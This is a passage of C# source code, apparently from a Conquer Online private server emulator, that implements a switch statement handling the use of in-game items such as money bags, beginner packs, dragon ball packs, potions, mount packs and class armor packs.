                                client.IncreaseExperience(client.ExpBall, false);
                                client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                                client.ExpBalls++;
                            }
                        }
                        else
                            client.Send(Constants.ExpBallsUsed);
                        break;
                    }
                #endregion               
                #region MeteorTearScroll
                case 723711:
                    {
                        if (client.Inventory.Count <= 36)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.Inventory.Add(1088002, 0, 5);
                        }
                        else
                            client.Send(Constants.FullInventory);
                        break;
                    }
                #endregion
                #region +1Stone Pack
                case 723712:
                    {
                        if (client.Inventory.Count <= 36)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.Inventory.Add(730001, 1, 5);
                        }
                        else
                            client.Send(Constants.FullInventory);
                        break;
                    }
                #endregion
                #region Class1MoneyBag
                case 723713:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.Money += 300000;
                        break;
                    }
                #endregion
                #region Class2MoneyBag
                case 723714:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.Money += 800000;
                        break;
                    }
                #endregion
                #region Class3MoneyBag
                case 723715:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.Money += 1200000;
                        break;
                    }
                #endregion
                #region Class4MoneyBag
                case 723716:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.Money += 1800000;
                        break;
                    }
                #endregion
                #region Class5MoneyBag
                case 723717:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.Money += 5000000;
                        break;
                    }
                #endregion
                #region Class6MoneyBag
                case 723718:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.Money += 20000000;
                        break;
                    }
                #endregion
                #region Class7MoneyBag
                case 723719:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.Money += 25000000;
                        break;
                    }
                #endregion
                #region Class8MoneyBag
                case 723720:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.Money += 80000000;
                        break;
                    }
                #endregion
                #region Class9MoneyBag
                case 723721:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.Money += 100000000;
                        break;
                    }
                #endregion
                #region Class10MoneyBag
                case 723722:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.Money += 300000000;
                        break;
                    }
                #endregion
                #region BeginnerPackL1
                case 723753:
                    {
                        if (client.Entity.Level >= 1)
                        {
                            if (client.Inventory.Count < 33)
                            {
                                client.Entity.Money += 5000;
                                client.Entity.ConquerPoints += 10;
                                client.Inventory.Add(1000000, 0, 3);
                                client.Inventory.Add(1001000, 0, 3);
                                client.Inventory.Add(723755, 0, 1);
                                client.Inventory.Add(1060020, 0, 1);
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 7 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 1", System.Drawing.Color.Red, Message.TopLeft));


                        break;
                    }
                #endregion
                #region BeginnerPackL10
                case 723755:
                    {
                        if (client.Entity.Level >= 10)
                        {
                            if (client.Inventory.Count < 24)
                            {

                                client.Inventory.Add(723700, 0, 10);//ExpBall
                                client.Inventory.Add(723017, 0, 3); //ExpPotion
                                client.Inventory.Add(723767, 0, 1);
                                client.Entity.Money += 7000;
                                client.Entity.ConquerPoints += 10;
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 14 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 10", System.Drawing.Color.Red, Message.TopLeft));


                        break;
                    }
                #endregion
                #region BeginnerPackL70
                case 723767:
                    {
                        if (client.Entity.Level >= 70)
                        {
                            if (client.Inventory.Count < 36)
                            {
                                client.Inventory.Add(723017, 0, 5); //ExpPotion
                                client.Entity.ConquerPoints += 20;
                                client.Inventory.Add(1080001, 0, 1); //Emerald
                                client.Inventory.Add(723772, 0, 1);
                                client.Inventory.Add(1060020, 0, 5);
                                client.Entity.Money += 7000;
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 7 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 70", System.Drawing.Color.Red, Message.TopLeft));

                        break;
                    }
                #endregion
                #region BeginnerPackL100
                case 723772:
                    {
                        if (client.Entity.Level >= 100)
                        {
                            if (client.Inventory.Count < 28)
                            {
                                client.Entity.Money += 10000;
                                client.Entity.ConquerPoints += 50;
                                client.Inventory.Add(721245, 0, 1);
                                client.Inventory.Add(723774, 0, 1);
                                client.Inventory.Add(723017, 0, 10); //ExpPotion
                                if (client.Entity.Class <= 15)
                                    client.Inventory.Add(800010, 0, 1); //Trojan
                                else if (client.Entity.Class <= 25)
                                    client.Inventory.Add(800410, 0, 1); //Warrior
                                else if (client.Entity.Class <= 45)
                                    client.Inventory.Add(800610, 0, 1); //Archer
                                else if (client.Entity.Class <= 55)
                                    client.Inventory.Add(800010, 0, 1); //Ninja
                                else if (client.Entity.Class <= 65)
                                    client.Inventory.Add(800010, 0, 1); //Monk
                                else //Taoist
                                    client.Inventory.Add(800508, 0, 1);

                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);


                            }
                            else
                                client.Send(new Message("You need to make atleast 12 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 100", System.Drawing.Color.Red, Message.TopLeft));
                        break;
                    }
                #endregion
                #region BeginnerPackL110
                case 723774:
                    {
                        if (client.Entity.Level >= 110)
                        {
                            if (client.Inventory.Count < 27)
                            {
                                client.Inventory.Add(723776, 0, 1);
                                client.Inventory.Add(721090, 0, 1);//MoonBox
                                client.Inventory.Add(723017, 0, 10); //ExpPotion
                                if (client.Entity.Class <= 15)
                                    CheckCommand("@item MythicBlade Super 0 0 0 13 0", client);
                                else if (client.Entity.Class <= 25)
                                    CheckCommand("@item DragonWand Super 0 0 0 13 0", client);
                                else if (client.Entity.Class <= 45)
                                    CheckCommand("@item AncientBow Super 0 0 0 13 0", client);
                                else if (client.Entity.Class <= 55)
                                    CheckCommand("@item FlameKatana Super 0 0 0 13 0", client);
                                else if (client.Entity.Class <= 65)
                                    CheckCommand("@item BeadsOfConsciousness Super 0 0 0 13 0", client);
                                else
                                    CheckCommand("@item ThunBacksword Super 0 0 0 3 0", client);
                                client.Entity.ConquerPoints += 100;
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 13 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 110", System.Drawing.Color.Red, Message.TopLeft));
                        break;
                    }
                #endregion
                #region BeginnerPackL120
                case 723776:
                    {
                        if (client.Entity.Level >= 120)
                        {

                            client.Entity.Money += 10000;
                            client.Entity.ConquerPoints += 500;
                            client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                        }

                        else
                            client.Send(new Message("You must be atleast level 120", System.Drawing.Color.Red, Message.TopLeft));
                        break;
                    }
                #endregion
                //723755, 723768, 723772  ,723774, 723776
                #region SteedPack
                case 729990:
                    {
                        Npcs dialog = new Npcs(client);
                        dialog.Text("Hello. You can chose a horse:");
                        dialog.Option("Spitfire horse", 1);
                        dialog.Option("Frostbite horse", 2);
                        dialog.Option("Blazehoof horse", 3);
                        dialog.Option("Spotted horse", 4);
                        dialog.Option("Zebra", 5);
                        dialog.Option("Nevermind.", 255);
                        dialog.Send();
                        client.ActiveNpc = item.ID;
                        break;
                    }
                #endregion
                #region Mount's Pack
                case 3004764:
                    {
                        client.Inventory.Add(200499, 0, 1);
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 3000254:
                    {
                        client.Inventory.Add(200407, 0, 1);
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 3000256:
                    {
                        client.Inventory.Add(200411, 0, 1);
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 3000257:
                    {
                        client.Inventory.Add(200412, 0, 1);
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 3000258:
                    {
                        client.Inventory.Add(200413, 0, 1);
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 3000259:
                    {
                        client.Inventory.Add(200414, 0, 1);
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 3000260:
                    {
                        client.Inventory.Add(200415, 0, 1);
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 3000261:
                    {
                        client.Inventory.Add(200426, 0, 1);
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 3000262:
                    {
                        client.Inventory.Add(200417, 0, 1);
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 3000263:
                    {
                        client.Inventory.Add(200418, 0, 1);
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 3000264:
                    {
                        client.Inventory.Add(200437, 0, 1);
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 3000265:
                    {
                        client.Inventory.Add(200420, 0, 1);
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 3000266:
                    {
                        client.Inventory.Add(200421, 0, 1);
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 3000267:
                    {
                        client.Inventory.Add(200427, 0, 1);
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 3000268:
                    {
                        client.Inventory.Add(200431, 0, 1);
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 3000269:
                    {
                        client.Inventory.Add(200438, 0, 1);
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 3000270:
                    {
                        client.Inventory.Add(200444, 0, 1);
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                case 3000271:
                    {
                        client.Inventory.Add(200442, 0, 1);
                        client.Inventory.Remove(item, Enums.ItemUse.RemoveFromStack);
                        break;
                    }
                #endregion
                #region TopMoneyBag
                case 723723:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.Money += 500000000;
                        break;
                    }
                #endregion
                #region DrasgonBallScroll
                case 720028:
                    {
                        if (client.Inventory.Count <= 31)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.Inventory.Add(1088000, 0, 10);
                        }
                        else
                            client.Send(Constants.FullInventory);
                        break;
                    }
                #endregion
                #region DragonBallPack(11)
                case 3000714:
                    {
                        if (client.Inventory.Count <= 29)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.Inventory.Add(1088000, 0, 11);
                        }
                        else
                            client.Send(Constants.FullInventory);
                        break;
                    }
                #endregion
                #region DragonBallPack(3)
                case 720891:
                    {
                        if (client.Inventory.Count <= 37)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.Inventory.Add(1088000, 0, 3);
                        }
                        else
                            client.Send(Constants.FullInventory);
                        break;
                    }
                #endregion
                #region DragonBallPack(5)
                case 727100:
                    {
                        if (client.Inventory.Count <= 35)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.Inventory.Add(1088000, 0, 5);
                        }
                        else
                            client.Send(Constants.FullInventory);
                        break;
                    }
                #endregion
                #region StudyBook[Arena]
                case 720774:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.SubClasses.StudyPoints += 50;
                        client.Send(new MTA.Network.GamePackets.SubClassShow(0) { ID = 8, Study = client.Entity.SubClasses.StudyPoints, StudyReceive = 50 }.ToArray());
                        MTA.Network.GamePackets._String str = new MTA.Network.GamePackets._String(true)
                        {
                            Type = 10,
                            UID = client.Entity.UID
                        };
                        str.Texts.Add("zf2-e300");
                        client.SendScreen(str.ToArray(), true);
                        client.Send(new Message("Congratulations you got 50 study Points keep going", System.Drawing.Color.Red, Message.TopLeft));
                    }
                    break;
                #endregion
                #region DragonGemPack
                case 727065:
                    {
                        if (client.Inventory.Count <= 31)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.Inventory.Add(700013, 0, 5);
                        }
                        else
                            client.Send(Constants.FullInventory);
                        break;
                    }
                #endregion
                #region MeteorScrollPack
                case 3003869:
                    {
                        if (client.Inventory.Count <= 31)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.Inventory.Add(720027, 0, 7);
                        }
                        else
                            client.Send(Constants.FullInventory);
                        break;
                    }
                #endregion
                #region MeteorScroll
                case 720027:
                    {
                        if (client.Inventory.Count <= 31)
                        {
                            client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                            client.Inventory.Add(1088001, 0, 10);
                        }
                        else
                            client.Send(Constants.FullInventory);
                        break;
                    }
                #endregion
                #region DoubleExperiencePotion
                case 723017:
                    {
                        client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.DoubleExperienceTime = 3600;
                        client.Entity.DoubleExpStamp = Time32.Now;
                        client.SuperPotion = 0;
                        client.Entity.Update(Network.GamePackets.Update.DoubleExpTimer, client.Entity.DoubleExperienceTime, 200, true);
                        break;
                    }
                #endregion
                #region SuperPotion
                case 728201:
                    {
                        client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.Remove);
                        client.Entity.DoubleExperienceTime = 7200;
                        client.Entity.DoubleExpStamp = Time32.Now;
                        client.SuperPotion = 5;
                        client.Entity.Update(Network.GamePackets.Update.DoubleExpTimer, client.Entity.DoubleExperienceTime, 500, true);
                        break;
                    }
                #endregion
                #region NinjaAmulet
                case 723583:
                    {
                        client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                        switch (client.Entity.Body % 10)
                        {
                            case 2:
                            case 4:
                                client.Entity.Body--;
                                break;
                            case 1:
                            case 3:
                                client.Entity.Body++;
                                break;
                        }
                        break;
                    }
                #endregion
                #region PrayingStone(S)
                case 1200000:
                    {
                        uint value = (uint)(3 * 24 * 60 * 60);
                        client.OnlineTrainingPoints += 10;
                        client.AddBless(value);
                        client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                        client.Entity.Update(Network.GamePackets.Update.OnlineTraining, client.OnlineTrainingPoints, false);
                        break;
                    }
                #endregion
                #region PrayingStone(M)
                case 1200001:
                    {
                        uint value = (uint)(7 * 24 * 60 * 60);
                        client.OnlineTrainingPoints += 20;
                        client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                        client.AddBless(value);
                        client.Entity.Update(Network.GamePackets.Update.OnlineTraining, client.OnlineTrainingPoints, false);
                        break;
                    }
                #endregion
                #region PrayingStone(L)
                case 1200002:
                    {
                        uint value = (uint)(30 * 24 * 60 * 60);
                        client.OnlineTrainingPoints += 30;
                        client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                        client.AddBless(value);
                        client.Entity.Update(Network.GamePackets.Update.OnlineTraining, client.OnlineTrainingPoints, false);
                        break;
                    }
                #endregion
                #region PenitenceAmulet
                case 723727:
                case 720128:
                    {
                        if (client.Entity.PKPoints >= 30)
                        {
                            client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            client.Entity.PKPoints -= 30;
                        }
                        break;
                    }
                #endregion
                #region DisguiseAmulet
                case 723724:
                    {
                        int disguise = Kernel.Random.Next(Database.DataHolder.Disguises.Length);
                        ushort selected = Database.DataHolder.Disguises[disguise];

                        client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);

                        bool wasTransformated = client.Entity.Transformed;
                        if (wasTransformated)
                        {
                            client.Entity.Hitpoints = client.Entity.MaxHitpoints;
                            client.Entity.TransformationID = 0;
                            client.Entity.TransformationStamp = Time32.Now;
                        }
                        ushort transformation = selected;
                        client.Entity.TransformationID = transformation;
                        client.Entity.TransformationStamp = Time32.Now;
                        client.Entity.TransformationTime = 110;
                        SpellUse spellUse = new SpellUse(true);
                        spellUse.Attacker = client.Entity.UID;
                        spellUse.SpellID = 1360;
                        spellUse.SpellLevel = 4;
                        spellUse.X = client.Entity.X;
                        spellUse.Y = client.Entity.Y;
                        spellUse.AddTarget(client.Entity, (uint)0, null);
                        client.Send(spellUse);
                        client.Entity.TransformationMaxHP = 3000;
                        double maxHP = client.Entity.MaxHitpoints;
                        double HP = client.Entity.Hitpoints;
                        double point = HP / maxHP;

                        client.Entity.Hitpoints = (uint)(client.Entity.TransformationMaxHP * point);
                        client.Entity.Update(Update.MaxHitpoints, client.Entity.TransformationMaxHP, false);
                        break;

                    }
                #endregion
                #region +8StonePack
                case 721222:
                    {
                        if (client.Entity.Level >= 10)
                        {
                            if (client.Inventory.Count < 38)
                            {
                                client.Inventory.Add(730008, 8, 1);//+8
                                client.Inventory.Add(730006, 6, 1); //+6
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 2 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 10 to open the Pack", System.Drawing.Color.Red, Message.TopLeft));


                        break;
                    }
                #endregion
                #region ToughDrillPack
                case 721223:
                    {
                        if (client.Entity.Level >= 10)
                        {
                            if (client.Inventory.Count < 38)
                            {
                                client.Inventory.Add(1200005, 0, 1);//ToughDrill
                                client.Inventory.Add(730003, 3, 1); //+3
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 2 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 10 to open the Pack", System.Drawing.Color.Red, Message.TopLeft));


                        break;
                    }
                #endregion
                #region SuperWarrior`sArmorPack
                case 721224:
                    {
                        uint itemid = 131069;
                        if (client.Entity.Level >= 10)
                        {
                            if (client.Inventory.Count < 32)
                            {
                                client.Inventory.Add(1200000, 0, 1);//PrayingStone
                                client.Inventory.Add(723700, 0, 1);//ExpBall
                                client.Inventory.Add(723017, 0, 5); //ExpPotion
                                ConquerItem items = new ConquerItem(true);
                                items.ID = itemid;
                                items.Color = MTA.Game.Enums.Color.White;
                                items.Plus = 5;
                                items.SocketOne = MTA.Game.Enums.Gem.EmptySocket;
                                items.Durability = items.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[itemid].Durability;
                                client.Inventory.Add(items, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 8 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 10 to open the Pack", System.Drawing.Color.Red, Message.TopLeft));


                        break;
                    }
                #endregion
                #region SuperWarrior`sHelmetPack
                case 721225:
                    {
                        uint itemid = 111069;
                        if (client.Entity.Level >= 10)
                        {
                            if (client.Inventory.Count < 32)
                            {
                                client.Inventory.Add(1200000, 0, 1);//PrayingStone
                                client.Inventory.Add(723700, 0, 1);//ExpBall
                                client.Inventory.Add(723017, 0, 5); //ExpPotion
                                ConquerItem items = new ConquerItem(true);
                                items.ID = itemid;
                                items.Color = MTA.Game.Enums.Color.White;
                                items.Plus = 5;
                                items.SocketOne = MTA.Game.Enums.Gem.EmptySocket;
                                items.Durability = items.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[itemid].Durability;
                                client.Inventory.Add(items, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 8 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 10 to open the Pack", System.Drawing.Color.Red, Message.TopLeft));


                        break;
                    }
                #endregion
                #region SuperTrojan`sArmorPack
                case 721226:
                    {
                        uint itemid = 130069;
                        if (client.Entity.Level >= 10)
                        {
                            if (client.Inventory.Count < 32)
                            {
                                client.Inventory.Add(1200000, 0, 1);//PrayingStone
                                client.Inventory.Add(723700, 0, 1);//ExpBall
                                client.Inventory.Add(723017, 0, 5); //ExpPotion
                                ConquerItem items = new ConquerItem(true);
                                items.ID = itemid;
                                items.Color = MTA.Game.Enums.Color.White;
                                items.Plus = 5;
                                items.SocketOne = MTA.Game.Enums.Gem.EmptySocket;
                                items.Durability = items.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[itemid].Durability;
                                client.Inventory.Add(items, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 8 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 10 to open the Pack", System.Drawing.Color.Red, Message.TopLeft));


                        break;
                    }
                #endregion
                #region SuperTrojan`sCoronetPack
                case 721227:
                    {
                        uint itemid = 118069;
                        if (client.Entity.Level >= 10)
                        {
                            if (client.Inventory.Count < 32)
                            {
                                client.Inventory.Add(1200000, 0, 1);//PrayingStone
                                client.Inventory.Add(723700, 0, 1);//ExpBall
                                client.Inventory.Add(723017, 0, 5); //ExpPotion
                                ConquerItem items = new ConquerItem(true);
                                items.ID = itemid;
                                items.Color = MTA.Game.Enums.Color.White;
                                items.Plus = 5;
                                items.SocketOne = MTA.Game.Enums.Gem.EmptySocket;
                                items.Durability = items.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[itemid].Durability;
                                client.Inventory.Add(items, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 8 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 10 to open the Pack", System.Drawing.Color.Red, Message.TopLeft));


                        break;
                    }
                #endregion
                #region SuperNinja`sVestPack
                case 721228:
                    {
                        uint itemid = 135069;
                        if (client.Entity.Level >= 10)
                        {
                            if (client.Inventory.Count < 32)
                            {
                                client.Inventory.Add(1200000, 0, 1);//PrayingStone
                                client.Inventory.Add(723700, 0, 1);//ExpBall
                                client.Inventory.Add(723017, 0, 5); //ExpPotion
                                ConquerItem items = new ConquerItem(true);
                                items.ID = itemid;
                                items.Color = MTA.Game.Enums.Color.White;
                                items.Plus = 5;
                                items.SocketOne = MTA.Game.Enums.Gem.EmptySocket;
                                items.Durability = items.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[itemid].Durability;
                                client.Inventory.Add(items, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 8 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 10 to open the Pack", System.Drawing.Color.Red, Message.TopLeft));


                        break;
                    }
                #endregion
                #region SuperNinja`sVeilPack
                case 721229:
                    {
                        uint itemid = 112069;
                        if (client.Entity.Level >= 10)
                        {
                            if (client.Inventory.Count < 32)
                            {
                                client.Inventory.Add(1200000, 0, 1);//PrayingStone
                                client.Inventory.Add(723700, 0, 1);//ExpBall
                                client.Inventory.Add(723017, 0, 5); //ExpPotion
                                ConquerItem items = new ConquerItem(true);
                                items.ID = itemid;
                                items.Color = MTA.Game.Enums.Color.White;
                                items.Plus = 5;
                                items.SocketOne = MTA.Game.Enums.Gem.EmptySocket;
                                items.Durability = items.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[itemid].Durability;
                                client.Inventory.Add(items, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 8 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 10 to open the Pack", System.Drawing.Color.Red, Message.TopLeft));


                        break;
                    }
                #endregion
                #region SuperTaoist`sRobePack
                case 721230:
                    {
                        uint itemid = 134069;
                        if (client.Entity.Level >= 10)
                        {
                            if (client.Inventory.Count < 32)
                            {
                                client.Inventory.Add(1200000, 0, 1);//PrayingStone
                                client.Inventory.Add(723700, 0, 1);//ExpBall
                                client.Inventory.Add(723017, 0, 5); //ExpPotion
                                ConquerItem items = new ConquerItem(true);
                                items.ID = itemid;
                                items.Color = MTA.Game.Enums.Color.White;
                                items.Plus = 5;
                                items.SocketOne = MTA.Game.Enums.Gem.EmptySocket;
                                items.Durability = items.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[itemid].Durability;
                                client.Inventory.Add(items, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 8 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 10 to open the Pack", System.Drawing.Color.Red, Message.TopLeft));


                        break;
                    }
                #endregion
                #region SuperTaoist`sCapPack
                case 721231:
                    {
                        uint itemid = 114069;
                        if (client.Entity.Level >= 10)
                        {
                            if (client.Inventory.Count < 32)
                            {
                                client.Inventory.Add(1200000, 0, 1);//PrayingStone
                                client.Inventory.Add(723700, 0, 1);//ExpBall
                                client.Inventory.Add(723017, 0, 5); //ExpPotion
                                ConquerItem items = new ConquerItem(true);
                                items.ID = itemid;
                                items.Color = MTA.Game.Enums.Color.White;
                                items.Plus = 5;
                                items.SocketOne = MTA.Game.Enums.Gem.EmptySocket;
                                items.Durability = items.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[itemid].Durability;
                                client.Inventory.Add(items, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 8 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 10 to open the Pack", System.Drawing.Color.Red, Message.TopLeft));


                        break;
                    }
                #endregion
                #region SuperArcher`sCoatPack
                case 721232:
                    {
                        uint itemid = 133049;
                        if (client.Entity.Level >= 10)
                        {
                            if (client.Inventory.Count < 32)
                            {
                                client.Inventory.Add(1200000, 0, 1);//PrayingStone
                                client.Inventory.Add(723700, 0, 1);//ExpBall
                                client.Inventory.Add(723017, 0, 5); //ExpPotion
                                ConquerItem items = new ConquerItem(true);
                                items.ID = itemid;
                                items.Color = MTA.Game.Enums.Color.White;
                                items.Plus = 5;
                                items.SocketOne = MTA.Game.Enums.Gem.EmptySocket;
                                items.Durability = items.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[itemid].Durability;
                                client.Inventory.Add(items, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 8 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 10 to open the Pack", System.Drawing.Color.Red, Message.TopLeft));


                        break;
                    }
                #endregion
                #region SuperArcher`sHatPack
                case 721233:
                    {
                        uint itemid = 113049;
                        if (client.Entity.Level >= 10)
                        {
                            if (client.Inventory.Count < 32)
                            {
                                client.Inventory.Add(1200000, 0, 1);//PrayingStone
                                client.Inventory.Add(723700, 0, 1);//ExpBall
                                client.Inventory.Add(723017, 0, 5); //ExpPotion
                                ConquerItem items = new ConquerItem(true);
                                items.ID = itemid;
                                items.Color = MTA.Game.Enums.Color.White;
                                items.Plus = 5;
                                items.SocketOne = MTA.Game.Enums.Gem.EmptySocket;
                                items.Durability = items.MaximDurability = MTA.Database.ConquerItemInformation.BaseInformations[itemid].Durability;
                                client.Inventory.Add(items, MTA.Game.Enums.ItemUse.CreateAndAdd);
                                client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.RemoveFromStack);
                            }
                            else
                                client.Send(new Message("You need to make atleast 8 free spots in your inventory.", System.Drawing.Color.Red, Message.TopLeft));
                        }
                        else
                            client.Send(new Message("You must be atleast level 10 to open the Pack", System.Drawing.Color.Red, Message.TopLeft));


                        break;
                    }
                #endregion
